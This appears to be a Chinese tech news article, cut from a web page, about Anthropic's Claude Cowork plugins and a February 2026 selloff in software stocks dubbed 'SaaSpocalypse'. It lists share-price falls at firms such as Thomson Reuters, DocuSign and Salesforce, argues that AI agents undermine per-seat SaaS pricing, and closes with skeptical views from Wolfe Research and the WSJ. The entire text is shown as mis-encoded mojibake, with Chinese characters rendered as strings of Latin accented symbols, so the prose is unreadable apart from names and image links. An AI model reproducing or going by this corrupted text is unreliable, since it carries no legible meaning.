<p>ä»¥ã€Œé”€å”®æ’ä»¶ã€ä¸ºä¾‹ï¼šå®ƒå¯ä»¥å°† Claude æ¥å…¥ä¸ªäºº CRM å’ŒçŸ¥è¯†åº“ï¼Œå­¦ä¹ é”€å”®æµç¨‹ã€‚</p>
<p>ä»æ­¤ï¼Œä»è°ƒç ”æ½œåœ¨å®¢æˆ·åˆ°ä¼šåè·Ÿè¿›ï¼Œäººç±»éƒ½èƒ½é€šè¿‡æŒ‡ä»¤è½»æ¾å®Œæˆã€‚æ’ä»¶é…ç½®åªéœ€ã€Œä¸€æ¬¡æ€§ã€æå®šï¼Œä¹‹åæ¯å½“æ¶‰åŠç›¸å…³ä»»åŠ¡ï¼ŒClaude éƒ½ä¼šè‡ªåŠ¨è°ƒç”¨èƒŒæ™¯ä¿¡æ¯ã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/49658bfc83294cb0974a50bee600d083~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5paw5pm65YWD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770891332&amp;x-signature=e%2FiNL5a29R5Pu%2B6xoNJkpFkroLs%3D" alt="" loading="lazy"/></p>
<p>ä¼—æ‰€å‘¨çŸ¥ï¼ŒClaude Cowork æ˜¯ã€Œéä»£ç ç‰ˆçš„ Claude Codeã€ã€‚</p>
<p>å®é™…ä¸Šï¼ŒClaude Code ä¹Ÿæ˜¯è½¯ä»¶å·¨å¤´å¸‚å€¼æƒ¨è·Œçš„ã€Œç½ªé­ç¥¸é¦–ã€ä¹‹ä¸€ã€‚å…¶å¼ºå¤§çš„ç¼–ç¨‹èƒ½åŠ›ï¼Œæ…åŠ¨ç”šè‡³é¢ è¦†äº†ç¼–ç åº•å±‚é€»è¾‘ã€‚</p>
<p>å®ƒä»¬çš„å‡ºç°ï¼Œé‡Šæ”¾äº†ä¸€ä¸ªå¼ºçƒˆçš„ä¿¡å·ï¼Œå¤§æ¨¡å‹æ­£åœ¨æ€å…¥æ‰€è°“çš„ã€Œåº”ç”¨å±‚ã€ã€‚</p>
<p>å¸‚åœºåˆ†æè®¤ä¸ºï¼ŒAnthropic ç­–ç•¥å·²å‘ç”Ÿè½¬å˜ï¼šå•çº¯æä¾› APIï¼ˆå·¥å…·ï¼‰â†’ã€Œå³æ’å³ç”¨ã€å·¥ä½œæµã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/b364b10ebc7f4d63a23c4cbee0244533~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5paw5pm65YWD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770891332&amp;x-signature=YvdtJQlFwA%2FLN7vyblUTD106rfo%3D" alt="" loading="lazy"/></p>
<p>å½“ Claude Cowork èƒ½è‡ªä¸»è¯»å– / ç»„ç»‡æ–‡ä»¶ï¼Œå¹¶å®Œæˆç«¯åˆ°ç«¯æ³•å¾‹åˆåŒå®¡æŸ¥ï¼Œå®ƒå°±ä¸å†æ˜¯ SaaS è½¯ä»¶çš„ã€ŒåŠ©æ‰‹ã€ï¼ŒçœŸæ­£è¿›åŒ–ä¸º SaaS çš„ã€Œæ›¿ä»£è€…ã€ã€‚</p>
<p>å› æ­¤ï¼Œå…¨çƒè½¯ä»¶è¡Œä¸šæ­£ç»å†ä¸€åœºæå…¶æƒ¨çƒˆçš„ã€Œä¿¡ä»°åœ°éœ‡ã€ï¼</p>
<p><strong>ã€Œ<img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c2f9d6293dc248a582ba579bb0dd602c~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5paw5pm65YWD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770891332&amp;x-signature=SjVCbeHO9odQ5pkNkWbRq%2FauQkM%3D" alt="" loading="lazy"/>ã€</strong></p>
<p><strong>ã€Œç¡…è°·ã€Œä¿¡ä»°ã€å´©å¡Œï¼ŒLLM æ€å…¥äº†åº”ç”¨å±‚ã€</strong></p>
<p>å®é™…ä¸Šï¼Œç¾è‚¡è½¯ä»¶æš´è·Œã€Œéä¸€æ—¥ä¹‹å¯’ã€ï¼Œä»å»å¹´å¼€å§‹å°±å·²ç»æœ‰äº†ä¸€ç³»åˆ—è¿¹è±¡ã€‚</p>
<p>åªä¸è¿‡ï¼ŒAnthropic è¿™æ¬¡æ›´æ–°ï¼Œæˆä¸ºäº†æœ€å¤§ã€Œå¯¼ç«ç´¢ã€ï¼Œç›´æ¥åœ¨ä¼ ç»Ÿè½¯ä»¶èµ–ä»¥ç”Ÿå­˜çš„é¢†åœ°æ’æ——ã€‚</p>
<p>è¿™ç§é™ç»´æ‰“å‡»ï¼Œè®©æŠ•èµ„è€…æƒ³èµ·äº†å½“å¹´çš„äºšé©¬é€Šâ€”â€”ä»å–ä¹¦èµ·å®¶ï¼Œæœ€ç»ˆé¢ è¦†äº†é›¶å”®ã€äº‘æœåŠ¡å’Œç‰©æµç­‰å¤šä¸ªè¡Œä¸šã€‚</p>
<p>ç»Ÿè®¡æ˜¾ç¤ºï¼Œè¿‡å»ä¸€ä¸ªæœˆï¼Œæ ‡æ™®åŒ—ç¾è½¯ä»¶æŒ‡æ•°ä¸‹è·Œäº† 18%ï¼Œè·Œè‡³ 2025 å¹´ 4 æœˆä»¥æ¥æœ€ä½æ°´å¹³ã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/ae728132b37a4caf8b4be7449dde6774~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5paw5pm65YWD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770891332&amp;x-signature=l6URoYqLvfH5YWYU6cKq3cMEk3g%3D" alt="" loading="lazy"/></p>
<p>çŸ­çŸ­ 5 ä¸ªäº¤æ˜“æ—¥å†…ï¼Œæ ‡æ™® 500 è½¯ä»¶æœåŠ¡æŒ‡æ•°æš´è·Œè¿‘ 13%ï¼Œå¸‚å€¼ç¼©æ°´ä¹‹å¿«ï¼Œç”šè‡³è®©åˆšåˆšåˆ›ä¸‹å†å²æ–°é«˜çš„æ ‡æ™® 500 å¤§ç›˜éƒ½é»¯ç„¶å¤±è‰²ã€‚</p>
<p>è¿™åœºé£æš´ä¸ä»…å¸­å·äº†åå°”è¡—ï¼Œä¹Ÿæ³¢åŠäº†äºšæ´²ã€æ¬§æ´²ã€‚å°±è¿è‹±ä¼Ÿè¾¾ CEO è€é»„ç´§æ€¥å‘å£°ï¼š</p>
<p>æœ‰è¿™æ ·ä¸€ç§è§‚ç‚¹è®¤ä¸ºï¼Œè½¯ä»¶è¡Œä¸šçš„å·¥å…·æ­£åœ¨è¡°è½ï¼Œå¹¶å°†è¢« AI å–ä»£â€¦â€¦</p>
<p>è¿™æ˜¯ä¸–ç•Œä¸Šæœ€ä¸åˆé€»è¾‘çš„äº‹æƒ…ï¼Œæ—¶é—´ä¼šè¯æ˜ä¸€åˆ‡ã€‚</p>
<p>ç¡®å®ï¼Œæ—¶é—´ä¼šè¯æ˜ä¸€åˆ‡ã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/02f7dba6f36f46e8805219332648c4a2~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5paw5pm65YWD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770891332&amp;x-signature=v9C%2BDy5MidqLm6nRN8TMpy7BnhA%3D" alt="" loading="lazy"/></p>
<p><strong>ã€ŒçŸ­çŸ­ä¸€å‘¨ï¼Œä¸Šä¸‡äº¿ç¾é‡‘æ²¡äº†ã€</strong></p>
<p>æƒ³è±¡ä¸€ä¸‹ï¼Œä½ æ˜¯æŸå®¶è´¢å¯Œ 500 å¼ºå…¬å¸çš„æ³•åŠ¡æ€»ç›‘ã€‚</p>
<p>å‘¨ä¸€æ—©ä¸Š 7 ç‚¹ï¼Œä½ æ‰“å¼€é‚®ç®±ï¼Œæœ¬è¯¥æ˜¯ç„¦è™‘çš„ä¸€å¤©â€”â€”ä¸Šå‘¨é—ç•™çš„åƒé¡µå¹¶è´­åˆåŒè¿˜ç­‰ç€äººå·¥å®¡è®¡ï¼Œæ¶‰åŠä¸Šç™¾ä¸ªéæ ‡æ¡æ¬¾ã€ç»­çº¦æ—¥æœŸã€äº¤å‰è¿çº¦æ¡ä»¶ã€‚</p>
<p>ä½†ä»Šæ—¶ä¸åŒä»¥å¾€ã€‚</p>
<p>Claude Cowork çš„æ³•å¾‹ Agent æ’ä»¶å·²ç»è¿å¤œç™»å½•äº†ä½ ä»¬çš„æ³•å¾‹æ•°æ®åº“ï¼Œè‡ªä¸»å®Œæˆäº†å®ä½“å…³ç³»æ˜ å°„ï¼Œæå–äº†æ‰€æœ‰å…³é”®æ—¥æœŸï¼Œè¯†åˆ«å‡ºä¸‰å¤„æ½œåœ¨é£é™©æ¡æ¬¾ï¼Œå¹¶ç”Ÿæˆäº†å®Œæ•´çš„åˆè§„æŠ¥å‘Šï¼Œè¿ PDF éƒ½è‡ªåŠ¨æ’ç‰ˆå¥½äº†ã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c8beb4c175a54cba9ab2a98d2a5d53b3~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5paw5pm65YWD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770891332&amp;x-signature=EiFml91eetcEqxb1eNLsjGW1et8%3D" alt="" loading="lazy"/></p>
<p>ä½ ç›¯ç€å±å¹•ï¼Œå’–å•¡å‡‰äº†ä¹Ÿæ²¡å¯Ÿè§‰ï¼šå®ƒä¸éœ€è¦ä½ ç‚¹ä»»ä½•æŒ‰é’®ï¼Œå®ƒç›´æ¥ã€Œåšäº†ã€ã€‚</p>
<p>è¿™ä¸æ˜¯ç§‘å¹»ã€‚è¿™æ˜¯ 2026 å¹´ 2 æœˆ 3 æ—¥çš„ç°å®ã€‚</p>
<p>å¯¹äºæ³•å¾‹ç§‘æŠ€è¡Œä¸šæ¥è¯´ï¼Œè¿™è™½ç„¶ä¸æ˜¯ 1929 å¹´çš„ã€Œå¤§è§æ¡ã€ï¼Œä½†æƒ…å†µä¹Ÿç»å¯¹ä¸å¦™ã€‚</p>
<p>Â· æ±¤æ£®è·¯é€å¸‚å€¼è’¸å‘äº†çº¦ 15%ã€‚</p>
<p>Â· å¾‹å•†è”è®¯çš„æ¯å…¬å¸ä¸‹è·Œäº†çº¦ 14%ã€‚</p>
<p>Â· ç”µå­ç­¾åå† å†› DocuSign è·Œäº† 11%ã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/a660888bb7c14be18d5e7709f0f25a6a~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5paw5pm65YWD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770891332&amp;x-signature=4Qh%2F2AxNeWHXjXAOJycy4gQEvIc%3D" alt="" loading="lazy"/></p>
<p>ä¸€å¹´æ¥ï¼Œæ³•å¾‹ç§‘æŠ€å…¬å¸ä¸€ç›´åœ¨ç‚’ä½œæ™ºèƒ½ä½“ AI æ˜¯æœªæ¥ï¼Œä½†æ²¡æœ‰æ‹¿å‡ºå¤ªå¤šå®è´¨æˆæœã€‚</p>
<p>ç°åœ¨ï¼Œä¸€å®¶åŸºç¡€æ¨¡å‹å…¬å¸å‘å¸ƒäº†ä¸€æ¬¾æ™ºèƒ½ä½“æ³•å¾‹å·¥å…·ï¼Œå¸‚åœºçªç„¶æ„è¯†åˆ°ï¼Œæ³•å¾‹ AIã€Œå¤§ä¼—åŒ–ã€å¯èƒ½å°†æ³•å¾‹ç§‘æŠ€çš„å®¢æˆ·ç¾¤ã€Œå¤§ä¼—åŒ–ã€åˆ°æ¶ˆå¤±çš„åœ°æ­¥ã€‚</p>
<p>è¿™ç›´æ¥å¼•çˆ†äº†ç¾è‚¡è½¯ä»¶è‚¡é›†ä½“ä¸‹è·Œâ€”â€”</p>
<p>Gartner æš´è·Œ 21%ï¼ŒThomson Reuters è·Œ 18%ï¼ŒServiceNow è·Œ 11%ï¼ŒSalesforce ä¸€åº¦ç†”æ–­ã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/ee5ea0f325a04c5aaf2f110f394c1526~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5paw5pm65YWD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770891332&amp;x-signature=uGrSP68SsmPbcB3CmuZH3iIVj%2BE%3D" alt="" loading="lazy"/></p>
<p>çº³æŒ‡ 100 ä¸¤å¤©è·Œæ‰ 5500 äº¿ç¾å…ƒå¸‚å€¼ï¼Œæ˜¯å»å¹´ 10 æœˆä»¥æ¥çš„æœ€æƒ¨çºªå½•ã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/1fa7df599d9a41bb9d28b4911ff94397~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5paw5pm65YWD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770891332&amp;x-signature=TwtPy7Q1SyNQEP2RFaRI4Sif0As%3D" alt="" loading="lazy"/></p>
<p>è¿™æ³¢ã€Œè½¯ä»¶è‚¡å¤§å± æ€ã€ä» 2 æœˆ 3 æ—¥å¼€å§‹ï¼Œä¸€è·¯è”“å»¶åˆ° 2 æœˆ 4 æ—¥ï¼Œäº¤æ˜“å‘˜ä»¬å·²ç»ç»™å®ƒèµ·äº†ä¸ªæ–°åå­—ï¼šã€ŒSaaSpocalypseã€â€”â€”SaaS ä¸–ç•Œæœ«æ—¥ã€‚</p>
<p>è€Œä¸”è¿™ç§æŠ›å”®æ½®æ‰©å¤§åˆ°äº†æ›´å¤§çš„å¸‚åœºã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/ea2b9e3a975341fdb12597e06c8ad016~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5paw5pm65YWD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770891332&amp;x-signature=YMZToPWsArPI0D8y3Q7yO0VFFSg%3D" alt="" loading="lazy"/></p>
<p>ç”±äºå¸‚åœºæ‹…å¿§ç§å‹Ÿä¿¡è´·è‚¡ç¥¨å¯¹ã€Œå— AI å†²å‡»çš„è½¯ä»¶å…¬å¸çš„é£é™©æ•å£ã€ï¼Œç›¸å…³ä¸ªè‚¡å¤§å¹…ä¸‹è·Œã€‚</p>
<p>Blue Owlã€TPGã€Ares Management å’Œ KKR å‡ä¸‹è·Œè¶… 10%ã€‚Apollo ä¸‹è·Œ 7%ï¼Œè´è±å¾·ï¼ˆBlackRockï¼‰ä¸‹è·Œ 5%ã€‚</p>
<p>iShares è½¯ä»¶ ETF ä»Šå¹´å·²ä¸‹è·Œ 20%ï¼Œåˆ›ä¸‰å¹´æœ€å¤§å•æ—¥è·Œå¹…ã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/05cd449838654ee6a8ad171758e270cc~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5paw5pm65YWD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770891332&amp;x-signature=5jlDC18g68GyFGtIXkVZTD%2B3T%2BU%3D" alt="" loading="lazy"/></p>
<p>æ•´ä¸ªè½¯ä»¶æ¿å—åƒè¢«æŠ½èµ°äº†æ°§æ°”ã€‚</p>
<p><strong>ã€Œå¸‚åœºææ…Œæƒ…ç»ªï¼Œåœ¨å…¨çƒè”“å»¶ã€‚ã€</strong></p>
<p>æ¬§æ´²å¹¿å‘Šå·¨å¤´ WPPã€Omnicomã€Publicis é›†ä½“ä¸‹æŒ« 10% ä»¥ä¸Šï¼Œæ¬§æ´²è‚¡å¸‚è’¸å‘äº† 3000 äº¿ç¾å…ƒã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/23eb97a50dbb4629847952761f882898~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5paw5pm65YWD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770891332&amp;x-signature=CZJpNZNhlapoV882NlN6xbpxoew%3D" alt="" loading="lazy"/></p>
<p>è‹±å›½åŸæœ¬è¢«è§†ä¸º AI èµ¢å®¶çš„ Relxï¼ˆæ‹¥æœ‰ LexisNexisï¼‰é‡æŒ« 14.4%ï¼Œä¼¦æ•¦è¯äº¤æ‰€é›†å›¢ï¼ˆLSEGï¼‰ä¸‹è·Œ 12.8%ï¼Œåˆ›äº”å¹´æœ€å·®å•æ—¥è¡¨ç°ã€‚å¹¿å‘Šå·¨å¤´ WPP å’Œ Omnicom ä¹Ÿå› æ‹…å¿ƒè¥é”€å·¥ä½œè¢«è‡ªåŠ¨åŒ–è€Œå¤§è·Œã€‚</p>
<p>å°åº¦ IT å·¨å¤´å¦‚ TCSã€Infosys æ­£é¢ä¸´ 3000 äº¿ç¾å…ƒè¥æ”¶é£é™© ï¼Œä¸€å¤©è’¸å‘ 19.1 ä¸‡äº¿å¢å¸ƒï¼Œçº¦ 2010 äº¿ç¾å…ƒã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/2e95b08c9b1e4c23a584afdcd163e2cb~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5paw5pm65YWD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770891332&amp;x-signature=pORyFRyOFU7SgoV8Y24fBYeFtkA%3D" alt="" loading="lazy"/></p>
<p>åŠ³åŠ¨åŠ›æˆæœ¬å¥—åˆ©ä¼¼ä¹æ­£åœ¨æ¶ˆå¤±ï¼Œ160 ä¸‡å°åº¦ IT ä»ä¸šè€…å—å½±å“ï¼Œè€Œ Anthropic ä»…æœ‰ 2500 åå‘˜å·¥ã€‚</p>
<p>ç°åœ¨å¸‚åœºè¿˜æœ‰è°åœ¨è°ˆ AI æ³¡æ²«ï¼Ÿ</p>
<p><strong>ã€ŒAnthropic è¿™åªã€</strong> <strong>ã€ŒAIã€</strong> <strong>ã€Œè´è¶æ‰‡äº†ä¸€ä¸‹ç¿…è†€ï¼Œå…¨çƒè‚¡å¸‚ç‹‚é£æš´é›¨ã€ä»¤äººèƒ†å¯’â”€â”€ã€</strong></p>
<p>å®ƒè¿™æ¬¡æ²¡æœ‰å–æ¨¡å‹ï¼Œå–çš„æ˜¯ã€ŒIT è¡Œä¸šçš„æ­»äº¡åˆ¤å†³ä¹¦ã€ã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/33443d8acab04292b44ccbfe2014cd54~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5paw5pm65YWD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770891332&amp;x-signature=ni%2BgzLVJl6sT1gKNbYGcZ%2Fr1jbs%3D" alt="" loading="lazy"/></p>
<p><strong>ã€Œå…¨çƒ SaaS æµ©åŠ«ï¼Œéƒ½æ˜¯ AI å¹²çš„ã€</strong></p>
<p>å¾®è½¯ã€Salesforceã€Adobeï¼Œä¸ªä¸ªæ˜¯ SaaS ç¿˜æ¥šã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/f9f8f012a03c491eb1d810183b5fe261~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5paw5pm65YWD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770891332&amp;x-signature=tzR9YYLDsPx4%2BHGq1WqtlYJO%2F%2Fs%3D" alt="" loading="lazy"/></p>
<p>2023 å¹´å…¨çƒå…‰åœ¨äº‘ç«¯ SaaS ä¸Šçš„èŠ±é”€å°±è¶…è¿‡äº† 4000 äº¿ç¾å…ƒã€‚ä½†ç°åœ¨ï¼Œè¿™å¥—æ¨¡å¼æ­£é¢ä¸´ç”Ÿæˆå¼ AI çš„çŒ›çƒˆå†²å‡»ã€‚</p>
<p>è­¦å‘Šå…¶å®æ—©å°±æœ‰äº†ï¼šAI å·¥å…·ï¼Œå°¤å…¶æ˜¯é‚£äº›èƒ½è‡ªåŠ¨æ‰§è¡Œä»»åŠ¡çš„ AI æ™ºèƒ½ä½“ï¼Œå¯èƒ½ä¼šè®©å¾ˆå¤š SaaS è½¯ä»¶å˜å¾—ã€Œæ²¡å¿…è¦ã€ã€‚</p>
<p>è€Œ Anthropic å‘å¸ƒçš„ Cowork æ’ä»¶ï¼Œæ˜¯å‹å®éª†é©¼çš„æœ€åä¸€æ ¹ç¨»è‰ã€‚</p>
<p>ä¼ ç»Ÿ SaaS çš„æŠ¤åŸæ²³å»ºç«‹åœ¨ä¸‰ä¸ªæ”¯æŸ±ä¸Šï¼š</p>
<ol>
<li>æŒ‰å¸­ä½ï¼ˆPer-Seatï¼‰æ”¶è´¹â€”â€”äººè¶Šå¤šï¼Œé’±è¶Šå¤šï¼›</li>
<li>ç”¨æˆ·å¿…é¡»é€‚é…å¤æ‚çš„ UI/UXï¼›</li>
<li>åŠŸèƒ½è¶Šå…¨ã€è¶Šå°é—­ï¼Œå£å’è¶Šé«˜ã€‚</li>
</ol>
<p>ä½† Claude Cowork æŠŠè¿™ä¸€åˆ‡éƒ½è¸©ç¢äº†ã€‚ç°åœ¨æ˜¯ AaaSï¼ˆAgent as a Serviceï¼‰çš„æ—¶ä»£ï¼š</p>
<ul>
<li>æ”¶è´¹æ¨¡å¼ â†’ æŒ‰äº§å‡ºï¼ˆPer-Outcomeï¼‰è®¡è´¹ï¼›</li>
<li>äº¤äº’é€»è¾‘ â†’ é›¶ UIï¼ŒAI åœ¨åå°ç›´æ¥æ“ä½œï¼›</li>
<li>ç³»ç»Ÿä»·å€¼ â†’ æ¥å£è¶Šå¼€æ”¾ï¼Œå­˜æ´»æ¦‚ç‡è¶Šé«˜ã€‚</li>
</ul>
<p>æ¯ç­çš„é€»è¾‘æå…¶ç®€å•ï¼š</p>
<p>ä¸€ä¸ª Claude æ™ºèƒ½ä½“ï¼Œèƒ½å¹²æ‰ 10 ä¸ªåˆçº§ä¼šè®¡æˆ–æ³•åŠ¡åŠ©ç†çš„å·¥ä½œé‡ã€‚</p>
<p>ä¸€å®¶å…¬å¸åŸæœ¬éœ€è¦è´­ä¹° 100 ä¸ª Salesforce æˆ– Zendesk å¸­ä½ï¼Œç°åœ¨åªéœ€è¦ 10 ä¸ª Claude å°±å¤Ÿäº†ã€‚</p>
<p>å¸­ä½è´¹æ˜¯ SaaS å…¬å¸çš„å‘½æ ¹å­ï¼Œè€Œ AI æ­£åœ¨ç”¨æ‰‹æœ¯åˆ€ç²¾å‡†åˆ‡æ–­å®ƒã€‚</p>
<p>äºæ˜¯ï¼Œé‚£äº› SaaS è¢«ã€Œåˆ¤æ­»åˆ‘ã€â€”â€”</p>
<p>DocuSign æš´è·Œï¼Œå› ä¸º Claude èƒ½è‡ªå·±è¯»æ‡‚åˆåŒå¹¶æ“ä½œç­¾ç½²æµï¼›</p>
<p>Zendesk å´©ç›˜ï¼Œå› ä¸º AI å®¢æœå·²è¾¾åˆ° 95% äººç±»æ°´å¹³ï¼›</p>
<p>HubSpot ä¸‹æŒ«ï¼Œå› ä¸º AI ç°åœ¨èƒ½è‡ªåŠ¨æ’°å†™ã€å‘é€ã€è·Ÿè¸ªè¥é”€é‚®ä»¶ï¼Œç”šè‡³è‡ªåˆ›ç­–ç•¥ã€‚</p>
<p>ä½ æ˜¯å¦è¿˜æ„¿æ„ä¸ºä¸€ä¸ªæ¼‚äº®çš„ UI ä»˜è´¹ï¼Œå½“ AI å¯ä»¥åœ¨åå°ç›´æ¥å®Œæˆä¸€åˆ‡ï¼Ÿ</p>
<p>æ–°çš„å…±è¯†æµ®ç°ï¼šï¼ˆè½¯ä»¶ï¼‰æœåŠ¡ç»æµæ­£é¢ä¸´ç¼“æ…¢å´ä¸å¯é¿å…çš„æ¶ˆäº¡ã€‚éšç€ AIã€è‡ªä¸»æœºå™¨äººåŠå…¶ä¸ç‰©ç†ä¸–ç•Œçš„èåˆï¼Œå°†é«˜ç«¯æœåŠ¡å•†å“åŒ–ï¼Œã€Œäººå·¥åŒ…è£…ã€çš„è½¯ä»¶æ›¾ç»äº«æœ‰çš„æº¢ä»·æ­£åœ¨è¿…é€Ÿè’¸å‘ã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/48f5078fa99e4a118ec11811dc4af976~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5paw5pm65YWD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770891332&amp;x-signature=Jim0AIc9Pd6llfarai78nh79%2B8A%3D" alt="" loading="lazy"/></p>
<p>æ›´æ®‹é…·çš„æ˜¯äºŒé˜¶æ‰“å‡»ã€‚</p>
<p>è½¯ä»¶å…¬å¸æ˜¯äº‘æœåŠ¡å•†æœ€å¤§çš„å®¢æˆ·ç¾¤ã€‚</p>
<p>å½“è½¯ä»¶å…¬å¸è¢« AI é¢ è¦†ï¼Œäº‘å·¨å¤´ä¹Ÿéš¾é€ƒå¹²ç³»ï¼š Â Oracle è·Œ 3.4%ï¼ŒMicrosoft è·Œ 2.9%ï¼Œè‹±ä¼Ÿè¾¾è·Œ 2.8%ã€‚</p>
<p>AMD å­£åº¦è¥æ”¶è¶…é¢„æœŸã€ç»™å‡º 98 äº¿ç¾å…ƒå¼ºåŠ²æŒ‡å¼•ï¼Œç›˜åè‚¡ä»·å´è·Œäº† 5â€“8%â€”â€”å› ä¸ºæ•°æ®ä¸­å¿ƒå¯¹å†…å­˜çš„ç–¯ç‹‚éœ€æ±‚æ­£åœ¨æŠŠæˆæœ¬æ¨åˆ°å¤©ä¸Šï¼Œåˆ©æ¶¦ç‡è¢«æ´»æ´»åƒæ‰ã€‚</p>
<p><strong>ã€Œ<img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/31bf65300c9346ad925452e1e47aff7a~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5paw5pm65YWD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770891332&amp;x-signature=ValgkdCpyLURC3iwou1WSTXqw%2Bk%3D" alt="" loading="lazy"/>ã€</strong></p>
<p><strong>ã€Œå¤¸å¤§äº†å—ï¼Ÿã€</strong></p>
<p>AI æ€æ­» SaaSï¼Œå¸‚åœºå¯¹æ­¤å¹¶ä¸å®Œå…¨è®¤åŒã€‚</p>
<p>Wolfe Researchï¼ˆæ²ƒå°”å¤«ç ”ç©¶ï¼‰ æœ€æ–°æŠ¥å‘Šç›´è¨€ï¼Œã€ŒSaaS ä¹‹æ­»è¢«å¤¸å¤§äº†ã€ã€‚</p>
<p>ä¸€åœºç½‘ç»œç ”è®¨ä¼šï¼Œä»–ä»¬å¾—å‡ºçš„æ ¸å¿ƒè§‚ç‚¹æ˜¯ï¼š<strong>ã€ŒAIã€</strong> <strong>ã€Œä¸ä¼šæŠŠã€</strong> <strong>ã€ŒSaaSã€</strong> <strong>ã€Œä¸€åˆ€æ€æ­»ã€‚ã€</strong></p>
<p>å› ä¸ºå¾ˆå¤š SaaS å–çš„ä¸æ˜¯ã€Œè½¯ä»¶ä»£ç ã€ï¼Œè€Œæ˜¯ç¨³å®šçš„ä¸šåŠ¡æµç¨‹èƒ½åŠ› / è¿è¥äº¤ä»˜ï¼ˆå¯é æ€§ã€å®‰å…¨ã€é›†æˆç­‰ï¼‰ï¼ŒAI æ›´å¯èƒ½æ‰©å¤§å¸‚åœºï¼Œä¸ä¼šå•çº¯èš•é£Ÿ SaaSã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/7f56e74924fd4b23a780b2df4c140036~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5paw5pm65YWD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770891332&amp;x-signature=Wx76Owlopof0aaWuEvFnMHWkO7g%3D" alt="" loading="lazy"/></p>
<p>å¦ä¸€ç¯‡æ¥è‡ª WSJ æŠ¥é“ï¼Œæ˜¯è¿™ä¹ˆè¯´çš„ï¼šAI æ€ä¸æ­»è½¯ä»¶è¡Œä¸šï¼Œåªä¼šç»ˆç»“å®ƒçš„å¢é•¿ç¥è¯ã€‚</p>
<p>å¤§ä¼ä¸šä¼šç”¨é‚£ç§ã€Œæ°›å›´ç¼–ç  APPã€ï¼ˆvibe-coded appsï¼‰æ¥å–ä»£é«˜åº¦å¤æ‚çš„è½¯ä»¶å¹³å°ï¼Œæœªå…æœ‰äº›å¼‚æƒ³å¤©å¼€ã€‚</p>
